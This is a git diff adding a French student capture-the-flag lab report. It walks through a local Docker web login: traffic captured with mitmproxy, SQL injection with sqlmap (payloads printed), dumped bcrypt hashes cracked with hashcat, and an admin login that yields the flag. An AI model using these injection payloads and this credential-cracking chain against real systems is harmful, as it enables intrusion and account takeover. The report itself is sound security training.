@@ -1,3 +1,124 @@
+# Rapport TP Attaque/defense
+
+By Clement ALLEGRE--COMMINGES and PETIT Lucien
+
+## Sommaire
+
+## Introduction
+
+## 1. mise en place serveur proxy mitm
+
+```bash
+user@motivation:~/Documents $ sudo apt install mitmproxy
+
+user@motivation:~/Documents $ docker network inspect bridge
+[
+    {
+        "Name": "bridge",
+        "Id": "2fde6a211bd9b871c645ad466f740567082be3eef0eebc39aad5e6bf581b1171",
+        "Created": "2025-12-08T07:40:12.285337437Z",
+        "Scope": "local",
+        "Driver": "bridge",
+        "EnableIPv4": true,
+        "EnableIPv6": false,
+        "IPAM": {
+            "Driver": "default",
+            "Options": null,
+            "Config": [
+                {
+                    "Subnet": "172.17.0.0/16",
+                    "IPRange": "",
+                    "Gateway": "172.17.0.1"
+                }
+            ]
+        },
+        "Internal": false,
+        "Attachable": false,
+        "Ingress": false,
+        "ConfigFrom": {
+            "Network": ""
+        },
+        "ConfigOnly": false,
+        "Options": {
+            "com.docker.network.bridge.default_bridge": "true",
+            "com.docker.network.bridge.enable_icc": "true",
+            "com.docker.network.bridge.enable_ip_masquerade": "true",
+            "com.docker.network.bridge.host_binding_ipv4": "0.0.0.0",
+            "com.docker.network.bridge.name": "docker0",
+            "com.docker.network.driver.mtu": "1500"
+        },
+        "Labels": {},
+        "Containers": {
+            "3104e4742370b55669fe5d1205edcfab2519f9598376a1aa54450e078710efb5": {
+                "Name": "web_time",
+                "EndpointID": "fc508deaa6f4df1d2181e96d5f15ac9372555e1712900a1c9e141767bde342bd",
+                "MacAddress": "d6:43:7a:03:7c:90",
+                "IPv4Address": "172.17.0.3/16",
+                "IPv6Address": ""
+            },
+            "f73dbc04cab519ef83425de189f71651ff5bfc600c4f525d7a91ce9c5be322ca": {
+                "Name": "web_korp_terminal",
+                "EndpointID": "5a146cd336180af34f4b5fa526b422ec2078bc92fa1181dd609dc255d8fe1580",
+                "MacAddress": "aa:05:44:62:b9:ed",
+                "IPv4Address": "172.17.0.2/16",
+                "IPv6Address": ""
+            }
+        },
+        "Status": {
+            "IPAM": {
+                "Subnets": {
+                    "172.17.0.0/16": {
+                        "IPsInUse": 5,
+                        "DynamicIPsAvailable": 65531
+                    }
+                }
+            }
+        }
+    }
+]
+
+
+
+user@motivation:~/.mitmproxy $ docker ps
+CONTAINER ID   IMAGE                 COMMAND                  CREATED             STATUS             PORTS                                                   NAMES
+245b900a0e96   mitmproxy/mitmproxy   "docker-entrypoint.s…"   5 minutes ago       Up 5 minutes       0.0.0.0:8080->8080/tcp, [::]:8080->8080/tcp, 8081/tcp   crazy_wing
+f73dbc04cab5   web_korp_terminal     "/entrypoint.sh"         About an hour ago   Up About an hour   0.0.0.0:1337->1337/tcp, [::]:1337->1337/tcp             web_korp_terminal
+```
+
+```mermaid
+graph LR
+A[WebApp client]<-->  |port: 1337       port: 8080| B[Man in the Midel]
+B[MitmProxy] <--> |port: 8080       port:1337 | C[WebApp Terminal]
+```
+
+Lancement du client:
+
+```bash
+user@motivation:~/Documents/sqlmap-dev $ http_proxy=http://127.0.0.1:8080 lynx http://172.17.0.3:1337
+```
+
+![Alt text](./image/login.png)
+
+Pour lancer le mitm :
+
+```bash
+user@motivation:~ $ docker run --rm -it -v ~/.mitmproxy:/home/mitmproxy/.mitmproxy -p 8080:8080 mitmproxy/mitmproxy mitmdump --flow-detail 3 -w4 -w /home/mitmproxy/.mitmproxy/test.txt
+```
+
+Pour lancer le service Terminal Korp:
+
+```bash
+
+```
+
+## 2. dump des communication entre client est serveur
+
+Ensuite faire une tentative de connexion avec un user name et mot de passe aléatoire pour communiquer avec le serveur terminal Korp.
+
+Cela permettra au mitmproxy de nous retourner des information que l'ont exploitera ensuite.
+
+```bash
+
 user@motivation:~/.mitmproxy $ cat test.txt
 POST http://172.17.0.3:1337/?username=user&password=password HTTP/1.0
 Host: 172.17.0.3:1337
@@ -24,78 +145,11 @@ Connection: close
 "message": "Invalid user or password"
 }
 
+```
 
+## 3. utilisation du dump avec sqlmap pour recupéré la description des tables
 
-user@motivation:~/Documents/sqlmap-dev $ python sqlmap.py -r /home/user/.mitmproxy/test.txt --ignore-code 401 -p username
-
-
-
-16:37:23] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
-[16:37:26] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
-POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
-sqlmap identified the following injection point(s) with a total of 380 HTTP(s) requests:
----
-Parameter: username (POST)
-    Type: boolean-based blind
-    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
-    Payload: username=user' RLIKE (SELECT (CASE WHEN (8098=8098) THEN 0x75736572 ELSE 0x28 END))-- uAoT&password=password
-
-<< HTTP/1.1 401 UNAUTHORIZED 39b
-Server: Werkzeug/3.1.4 Python/3.12.12
-Date: Tue, 09 Dec 2025 16:19:58 GMT
-Content-Type: application/json
-Content-Length: 39
-Connection: close
-
-{
-"message": "Invalid user or password"
-}
-
-    Type: error-based
-    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
-    Payload: username=user' AND (SELECT 9045 FROM(SELECT COUNT(*),CONCAT(0x716b766b71,(SELECT (ELT(9045=9045,1))),0x7178707071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- MGMf&password=password
-
-<< HTTP/1.1 401 UNAUTHORIZED 39b
-Server: Werkzeug/3.1.4 Python/3.12.12
-Date: Tue, 09 Dec 2025 16:19:58 GMT
-Content-Type: application/json
-Content-Length: 39
-Connection: close
-
-{
-"message": "Invalid user or password"
-}
-
-    Type: time-based blind
-    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
-    Payload: username=user' AND (SELECT 4340 FROM (SELECT(SLEEP(5)))THqE)-- FTYa&password=password
-
-<< HTTP/1.1 401 UNAUTHORIZED 39b
-Server: Werkzeug/3.1.4 Python/3.12.12
-Date: Tue, 09 Dec 2025 16:19:58 GMT
-Content-Type: application/json
-Content-Length: 39
-Connection: close
-
-{
-"message": "Invalid user or password"
-}
----
-[16:37:43] [INFO] the back-end DBMS is MySQL
-back-end DBMS: MySQL >= 5.0 (MariaDB fork)
-[16:37:43] [WARNING] HTTP error codes detected during run:
-401 (Unauthorized) - 119 times, 500 (Internal Server Error) - 270 times
-[16:37:43] [INFO] fetched data logged to text files under '/home/user/.local/share/sqlmap/output/172.17.0.3'
-
-[*] ending @ 16:37:43 /2025-12-09/
-
-
-
-
-
-
-
-
+```bash
 user@motivation:~/Documents/sqlmap-dev $ python sqlmap.py -r /home/user/.mitmproxy/test.txt --ignore-code 401 -p username --tables
         ___
        __H__
@@ -430,11 +484,11 @@ Database: korp_terminal
 [16:40:01] [INFO] fetched data logged to text files under '/home/user/.local/share/sqlmap/output/172.17.0.3'
 
 [*] ending @ 16:40:01 /2025-12-09/
+```
 
+## 4. Utilisation de sqlmap pour récupérer les tables cibles (user, password)
 
-
-
-
+```bash
 user@motivation:~/Documents/sqlmap-dev $ python sqlmap.py -r /home/user/.mitmproxy/test.txt -D korp_terminal -T users --columns --ignore-code 401
         ___
        __H__
@@ -628,13 +682,11 @@ user@motivation:~/Documents $ cat users
 test:$2y$10$1vSdN5jTa5S0ybMs.FXUwemfLxeBYGgjGsTDis.fuD6mx0lq9tLNe
 user:$2y$10$bfni4oATx18uvyU9Aff8yuoXkjubqZyksIrj9zkSOwAYTBmN4Zroi
 admin:$2y$10$p34l3lUN9bZKhnT1.e891Ow.nrQnT7V73vt.IuOvfZH1Jygxsxps6
+```
 
+## 5. Utilisation de hascat pour retrouver les mot de passe associer aux hashs
 
-
-
-
-
-
+```bash
 user@DESKTOP-5QE5MM5:~$ sudo gzip -d rockyou.txt.gz
 
 
@@ -752,15 +804,14 @@ Hardware.Mon.#2..: Util: 78%
 
 Started: Tue Dec  9 18:05:08 2025
 Stopped: Tue Dec  9 18:08:00 2025
-user@DESKTOP-5QE5MM5:~$
 
+```
 
+## 6. Obtention du flag
 
-
-
-
-
-
-
+Tentaive de connexion avec user : `admin` et password : `myprecious` depuis le client
 
 Clearance to : Poly{t3rm1n4l_p4ssH4c4t_cr4ck1ng}
+![Alt text](./image/flag.png)
+
+## Conclusion
